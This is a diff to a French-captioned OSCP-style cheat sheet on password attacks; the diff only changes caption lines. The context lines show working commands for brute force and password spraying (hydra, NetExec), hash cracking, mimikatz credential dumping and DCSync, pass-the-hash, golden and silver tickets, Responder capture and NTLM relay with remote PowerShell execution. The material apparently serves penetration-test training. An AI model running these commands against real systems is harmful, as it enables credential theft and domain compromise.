@@ -11,7 +11,7 @@ Analyser les mécanismes d'authentification et les formats de hachage.
 ## Essais de mots de passe
 
 
-<p class="oscp-command-note">Vérifier des identifiants dans un environnement autorisé.</p>
+<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
 
 ```bash
 # SSH Brute Force
@@ -54,7 +54,7 @@ hydra -P <password_list> redis://<target_ip>
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-<p class="oscp-command-note">Vérifier des identifiants dans un environnement autorisé.</p>
+<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
 
 ```bash
 # Spraying passwords for RDP, one wordlist could be: /usr/share/wordlists/dirb/others/names.txt
@@ -62,7 +62,7 @@ hydra -L <user_list> -p "<password>" rdp://<target_ip>
 ```
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # WinRM password spraying
@@ -94,7 +94,7 @@ crackmapexec pop3 <target_ip> -u <user_list> -p <password_list> --continue-on-su
 ### Fichiers Office
 
 
-<p class="oscp-command-note">Préparer une empreinte pour John the Ripper.</p>
+<p class="oscp-command-note">Préparer une empreinte Office pour John.</p>
 
 ```bash
 # Extract hash from encrypted Office files
@@ -115,14 +115,14 @@ pdf2john <file.pdf> > pdf.txt
 ```
 
 
-<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
+<p class="oscp-command-note">Analyser des empreintes avec John.</p>
 
 ```bash
 john --wordlist=<wordlist> pdf.txt
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil pdfcrack.</p>
+<p class="oscp-command-note">Vérifier le mot de passe d&#x27;un document PDF.</p>
 
 ```bash
 pdfcrack -f <file.pdf> -w <wordlist>
@@ -132,14 +132,14 @@ pdfcrack -f <file.pdf> -w <wordlist>
 ### Archives ZIP
 
 
-<p class="oscp-command-note">Préparer une empreinte pour John the Ripper.</p>
+<p class="oscp-command-note">Préparer une empreinte ZIP pour John.</p>
 
 ```bash
 zip2john <file.zip> > zip.hash
 ```
 
 
-<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
+<p class="oscp-command-note">Analyser des empreintes avec John.</p>
 
 ```bash
 # (Optional), if the zip has too many files, them extract one and crack just that one to speed things up. If given errors delete the --format=zip.
@@ -149,7 +149,7 @@ hashcat -m 13600 zip.hash /path/to/wordlist.txt
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil fcrackzip.</p>
+<p class="oscp-command-note">Vérifier le mot de passe d&#x27;une archive ZIP.</p>
 
 ```bash
 # Perform a brute-force attack on a password-protected ZIP file
@@ -162,7 +162,7 @@ fcrackzip -u -D -p <wordlist> <file.zip>
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Vérifier des identifiants dans un environnement autorisé.</p>
+<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
 
 ```bash
 # HTTP POST brute-force using Hydra
@@ -170,35 +170,35 @@ hydra -l <username> -P <wordlist> <target_ip> http-post-form "/<login_uri>:<user
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil /.</p>
+
 
 ```text
 /<login_uri>
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Connexion HTTP POST ».</p>
+
 
 ```text
 <user_field>=<username>&<pass_field>=^PASS^
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil fm_usr.</p>
+
 
 ```text
 fm_usr=user&fm_pwd=^PASS^
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Connexion HTTP POST ».</p>
+
 
 ```text
 <failure_message>
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil login.</p>
+
 
 ```text
 Login failed. Invalid
@@ -210,7 +210,7 @@ Login failed. Invalid
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Vérifier des identifiants dans un environnement autorisé.</p>
+<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
 
 ```bash
 # HTTP GET brute-force attack using Hydra
@@ -221,7 +221,7 @@ hydra -l <username> -P <wordlist> <target_ip> http-get /
 ## Estimer le temps de calcul
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
+<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
 # Calculate keyspace for a password length of <length>
@@ -234,7 +234,7 @@ python3 -c "print(<keyspace> / <hash_rate>)"
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil characters.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « Estimer le temps de calcul ».</p>
 
 ```bash
 # Estimate cracking time for a 5-character alphanumeric password
@@ -249,7 +249,7 @@ python3 -c "print(62**5 / 1000000000)"  # example for 1B hashes per second
 ## Mutating Listes de mots
 
 
-<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
+<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
 
 ```bash
 # Using Hashcat with rule-based attacks
@@ -269,7 +269,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 **MD5**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 $1$salt$hash
@@ -290,7 +290,7 @@ $1$salt$hash
 **NTLM**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 <NTLM_HASH>
@@ -318,7 +318,7 @@ $1$salt$hash
 **bcrypt**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 $2a$10$abcdefghijklmnopqrstuv
@@ -332,7 +332,7 @@ $2a$10$abcdefghijklmnopqrstuv
 **Kerberos 5 TGS-REP etype 23**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 $krb5tgs$23$*user$realm$service*hash
@@ -346,7 +346,7 @@ $krb5tgs$23$*user$realm$service*hash
 **Kerberos 5 AS-REP etype 23**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 $krb5asrep$23$user@REALM:hash
@@ -367,7 +367,7 @@ $krb5asrep$23$user@REALM:hash
 **MS-Cache v2**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil domain.</p>
+
 
 ```text
 domain\username:hash:salt
@@ -381,7 +381,7 @@ domain\username:hash:salt
 **SHA-256**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 <SHA256_HASH>
@@ -395,7 +395,7 @@ domain\username:hash:salt
 **SHA-512**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 <SHA512_HASH>
@@ -416,7 +416,7 @@ domain\username:hash:salt
 **MD5 Crypt**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 $1$salt$hash
@@ -430,7 +430,7 @@ $1$salt$hash
 **LDAP MD5**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 {MD5}hash
@@ -444,7 +444,7 @@ $1$salt$hash
 **Kerberos TGS-REP etype 23**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 $krb5tgs$23$user$realm$service$hash
@@ -458,7 +458,7 @@ $krb5tgs$23$user$realm$service$hash
 **Kerberos AS-REP etype 23**
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>
+
 
 ```text
 $krb5asrep$23$user@realm:hash
@@ -470,7 +470,7 @@ $krb5asrep$23$user@realm:hash
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-childitem.</p>
+<p class="oscp-command-note">Rechercher des fichiers avec PowerShell.</p>
 
 ```powershell
 # Search for KeePass database (.kdbx) on Windows
@@ -478,7 +478,7 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil keepass2john.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « Gestionnaires de mots de passe ».</p>
 
 ```bash
 # Convert KeePass database to John format
@@ -492,7 +492,7 @@ hashcat -m 13400 keepass.hash <wordlist> -r <rule_file> --force
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil kpcli.</p>
+
 
 ```bash
 # Open the tool
@@ -515,7 +515,7 @@ get <entry_path or entry_id> <field_name>
 ## Phrases secrètes SSH
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil chmod.</p>
+<p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>
 
 ```bash
 # Set correct permissions for SSH private key
@@ -538,7 +538,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `/etc/shadow`  
 
 
-<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
+<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
 
 ```bash
 # 1. Identify the hash (can use hashes.com to do it), for example: root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7::: is a SHA-512 because of the $6$ and uses the mode -m 1800.
@@ -600,7 +600,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 **Extracts Credentials from LSA**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil lsadump.</p>
+
 
 ```text
 lsadump::lsa /inject
@@ -659,7 +659,7 @@ lsadump::lsa /inject
 **Extracts Passwords from Windows Vault**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil vault.</p>
+
 
 ```text
 vault::cred /patch
@@ -669,7 +669,7 @@ vault::cred /patch
 **Dumping Security Account Manager (SAM)**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil lsadump.</p>
+
 
 ```text
 lsadump::sam /system:<SYSTEM> /sam:<SAM>
@@ -679,7 +679,7 @@ lsadump::sam /system:<SYSTEM> /sam:<SAM>
 **Dumping Hashes from Active Directory**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil lsadump.</p>
+
 
 ```text
 lsadump::dcsync /domain:<DOMAIN> /user:<USERNAME>
@@ -694,7 +694,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 **Pass-the-Hash Attack (PTH)**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sekurlsa.</p>
+
 
 ```text
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>
@@ -704,7 +704,7 @@ sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>
 **Pass-the-Ticket Attack (PTT)**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>
+
 
 ```text
 kerberos::ptt <ticket.kirbi>
@@ -714,7 +714,7 @@ kerberos::ptt <ticket.kirbi>
 **Over-Pass-The-Hash / Pass-The-Key (Kerberos Ticket)**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sekurlsa.</p>
+
 
 ```text
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<AES256_HASH> /run:<COMMAND>
@@ -724,7 +724,7 @@ sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<A
 **Golden Ticket Creation**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>
+
 
 ```text
 kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID> /ticket:<OUTPUT_TICKET>
@@ -734,7 +734,7 @@ kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KR
 **Silver Ticket Creation**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>
+
 
 ```text
 kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SERVICE/SERVER> /service:<SERVICE> /rc4:<NTLM_HASH> /id:<USER_RID> /ptt
@@ -744,7 +744,7 @@ kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SE
 **Dump Kerberos Tickets for Specific User**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sekurlsa.</p>
+
 
 ```text
 sekurlsa::tickets /export
@@ -761,7 +761,7 @@ sekurlsa::tickets /export
 **Kerberos Silver Ticket Creation (Avancé)**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>
+
 
 ```text
 kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_HASH> /service:<SERVICE> /sid:<DOMAIN_SID>
@@ -771,7 +771,7 @@ kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_H
 **Over-Pass-the-Hash (with RC4)**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil sekurlsa.</p>
+
 
 ```text
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND>
@@ -781,7 +781,7 @@ sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND>
 **DPAPI Credential Decryption**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil dpapi.</p>
+
 
 ```text
 dpapi::cred /in:<CREDENTIAL_FILE>
@@ -802,7 +802,7 @@ dpapi::cred /in:<CREDENTIAL_FILE>
 `Evil-WinRM` · `mimikatz`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
 .\mimikatz.exe "privilege::debug" "[command]" "exit"
@@ -815,14 +815,14 @@ mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domai
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.exe.</p>
+
 
 ```powershell
 mimikatz.exe "privilege::debug" "[command]" "exit" > C:\temp\mimikatz_output.txt
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Mimikatz One-Liners ».</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « Mimikatz One-Liners ».</p>
 
 ```powershell
 $command = "privilege::debug [command] exit"
@@ -833,7 +833,7 @@ powershell -enc <encodedCommand>
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil evil-winrm.</p>
+<p class="oscp-command-note">Ouvrir une session distante WinRM.</p>
 
 ```powershell
 # Evil-WinRM (we need to connect and then execute it, not possible to send it within the same command)
@@ -852,7 +852,7 @@ powershell -Command "C:\\temp\\mimikatz.exe 'privilege::debug' '[command]' 'exit
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.exe.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz.exe "privilege::debug" "[command]" "exit" > nul 2>&1
@@ -862,7 +862,7 @@ mimikatz.exe "privilege::debug" "[command]" "exit" > nul 2>&1
 ## NTLM
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ps.</p>
+<p class="oscp-command-note">Afficher les processus actifs.</p>
 
 ```powershell
 PS C:\tools> .\mimikatz.exe
@@ -871,7 +871,7 @@ Privilege '20' OK
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # privilege::debug
@@ -893,7 +893,7 @@ Hash NTLM: <NTLM_HASH>
 ```
 
 
-<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
+<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
 
 ```bash
 # Rule is optional
@@ -901,7 +901,7 @@ hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashc
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-smbclient.</p>
+<p class="oscp-command-note">Commande Impacket dans la rubrique « NTLM ».</p>
 
 ```bash
 # Pass-the-Hash using SMBClient
@@ -914,7 +914,7 @@ impacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # privilege::debug
@@ -930,7 +930,7 @@ Hash NTLM: <NTLM_HASH>
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-psexec.</p>
+<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>
 
 ```bash
 # Using smbclient
@@ -950,7 +950,7 @@ xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>
 ## Cracking Net-NTLMv2
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Cracking Net-NTLMv2 ».</p>
+
 
 ```text
 <interface>
@@ -961,7 +961,7 @@ xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>
 `eth0` · `wlan0`  
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Cracking Net-NTLMv2 ».</p>
+
 
 ```text
 <responder_ip>
@@ -983,14 +983,14 @@ xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil responder.</p>
+<p class="oscp-command-note">Observer les requêtes de résolution de noms.</p>
 
 ```bash
 sudo responder -I <interface>
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « Cracking Net-NTLMv2 ».</p>
 
 ```powershell
 C:\Windows\system32> dir \\<responder_ip>\test
@@ -999,7 +999,7 @@ Access is denied.
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Cracking Net-NTLMv2 ».</p>
+
 
 ```bash
 [SMB] NTLMv2-SSP Client   : ::ffff:<victim_ip>
@@ -1012,7 +1012,7 @@ Access is denied.
 `5600`  
 
 
-<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
+<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
 
 ```bash
 hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt --force
@@ -1030,14 +1030,14 @@ hashcat (v6.2.5) starting
 `ntlmrelayx`  
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Relaying Net-NTLMv2 ».</p>
+
 
 ```text
 <target_ip>
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-ntlmrelayx.</p>
+<p class="oscp-command-note">Commande Impacket dans la rubrique « Relaying Net-NTLMv2 ».</p>
 
 ```bash
 impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "powershell -enc <base64_encoded_powershell_command_to_be_executed_on_the_target_machine>"
@@ -1057,7 +1057,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 ```
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Relaying Net-NTLMv2 ».</p>
+<p class="oscp-command-note">Script shell dans la rubrique « Relaying Net-NTLMv2 ».</p>
 
 ```bash
 [*] SMBD-Thread-4: Received connection from <victim_ip>, attacking target smb://<target_ip>
@@ -1068,7 +1068,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 ```
 
 
-<p class="oscp-command-note">Tester ou établir une connexion réseau avec Netcat.</p>
+<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
 ```bash
 # The port should match the port specified in the reverse shell command
@@ -1076,7 +1076,7 @@ nc -nvlp [port]
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
+
 
 ```powershell
 # <responder_ip>: IP address of the machine running the Responder server.
@@ -1092,14 +1092,14 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ### Database Tool
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil pip3.</p>
+<p class="oscp-command-note">Gérer les modules Python.</p>
 
 ```bash
 sudo pip3 install defaultcreds-cheat-sheet
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil creds.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « Database Tool ».</p>
 
 ```bash
 creds search [service/web_server/term]
@@ -1142,7 +1142,7 @@ creds search tomcat --proxy=http://localhost:8080 export
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil root.</p>
+
 
 ```text
 # Commonly guessed or default credentials
@@ -1185,7 +1185,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `/usr/share/wordlists/rockyou.txt`  
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Recommended Listes de mots ».</p>
+
 
 ```text
 /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
@@ -1211,7 +1211,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `/usr/share/dirb/wordlists/common.txt` · `/usr/share/dirb/wordlists/big.txt`  
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Recommended Listes de mots ».</p>
+
 
 ```text
 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
@@ -1221,7 +1221,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ### Énumération
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb target
@@ -1316,7 +1316,7 @@ Most likely local admin ✅
 ------
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb target -u [username] -p '[P@$$w0rd!]'
@@ -1356,7 +1356,7 @@ netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --no-brut
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil user1.</p>
+
 
 ```text
 user1 -> pass1
@@ -1364,7 +1364,7 @@ user2 -> pass2
 ```
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+
 
 ```bash
 netexec smb target -u [username] -p '[password]' --local-auth
@@ -1382,7 +1382,7 @@ netexec smb [target] -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc
 `-k`  
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+
 
 ```bash
 netexec smb target -u [username] -p [password] -k
@@ -1394,7 +1394,7 @@ netexec smb target -u [username] -p [password] -k
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb target -u [username] -p [password] --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
@@ -1418,7 +1418,7 @@ netexec smb target -u [username] -p [password] -k --get-file target_file output_
 Transférer ou récupérer des fichiers dans le laboratoire.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec ftp target -u [username] -p [password] --ls
@@ -1440,7 +1440,7 @@ netexec ftp target -u [username] -p [password] --ls folder_name --get file_name
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec ldap target -u '' -p '' --users
@@ -1467,7 +1467,7 @@ netexec ldap target -u [username] -p [password] --asreproast asrep.txt
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec mssql target -u [username] -p [password]
@@ -1478,7 +1478,7 @@ netexec mssql target -u [username] -p [password]
 `xp_cmdshell` · `-X` · `-x`  
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+
 
 ```bash
 netexec mssql target -u [username] -p [password] -x [command_to_execute]
@@ -1493,14 +1493,14 @@ netexec mssql target -u [username] -p [password] --get-file output_file target_f
 ### Secrets Dump
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil nxc.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 nxc smb target -u [username] -p [password] --sam
 ```
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+
 
 ```bash
 netexec smb target -u [username] -p [password] --local-auth --lsa
@@ -1514,7 +1514,7 @@ netexec smb target -u [username] -p [password] --ntds
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil nxc.</p>
+
 
 ```bash
 # Using Lsassy
@@ -1528,7 +1528,7 @@ nxc smb target -u [username] -p [password] -M mimikatz -o COMMAND='"lsadump::dcs
 ```
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+
 
 ```bash
 netexec ldap target -u [username] -p [password] --gmsa-convert-id id
@@ -1551,7 +1551,7 @@ netexec smb [target] -u [username] -p [password] --laps
 `dpapi`  
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+
 
 ```bash
 netexec smb [target] -u [username] -p [password] --laps --dpapi
@@ -1563,7 +1563,7 @@ netexec smb [target] -u [username] -p [password] -M wifi
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil nxc.</p>
+
 
 ```bash
 # You can check if keepass is installed on the target computer and then steal the master password and decrypt the database
@@ -1578,7 +1578,7 @@ nxc smb [target] -u [username] -p [password] -M keepass_trigger -o KEEPASS_CONFI
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « BloodHound ».</p>
+
 
 ```text
 ~/.nxc/nxc.conf
@@ -1595,7 +1595,7 @@ bh_pass = pass
 ```
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec ldap [target] -u [username] -p [password] --bloodhound -ns ip --collection All
@@ -1607,7 +1607,7 @@ netexec ldap [target] -u [username] -p [password] --bloodhound -ns ip --collecti
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb ip -u [username] -p [password] -M webdav 
@@ -1617,7 +1617,7 @@ netexec smb ip -u [username] -p [password] -M webdav
 #### Veeam
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb [target] -u [username] -p [password] -M veeam
@@ -1627,7 +1627,7 @@ netexec smb [target] -u [username] -p [password] -M veeam
 #### slinky
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb ip -u [username] -p [password] -M slinky 
@@ -1637,7 +1637,7 @@ netexec smb ip -u [username] -p [password] -M slinky
 #### ntdsutil
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb ip -u [username] -p [password] -M ntdsutil 
@@ -1649,7 +1649,7 @@ netexec smb ip -u [username] -p [password] -M ntdsutil
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec ldap [target] -u [username] -p [password] -M ldap-checker
@@ -1659,7 +1659,7 @@ netexec ldap [target] -u [username] -p [password] -M ldap-checker
 #### Check if the DC is vulnerable to zerologon, petitpotam, nopac
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec smb [target] -u [username] -p [password] -M zerologon
@@ -1673,7 +1673,7 @@ netexec smb [target] -u [username] -p [password] -M nopac
 #### Check the MachineAccountQuota
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec ldap [target] -u [username] -p [password] -M maq
@@ -1683,7 +1683,7 @@ netexec ldap [target] -u [username] -p [password] -M maq
 #### ADCS Énumération
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
 
 ```bash
 netexec ldap [target] -u [username] -p [password] -M adcs
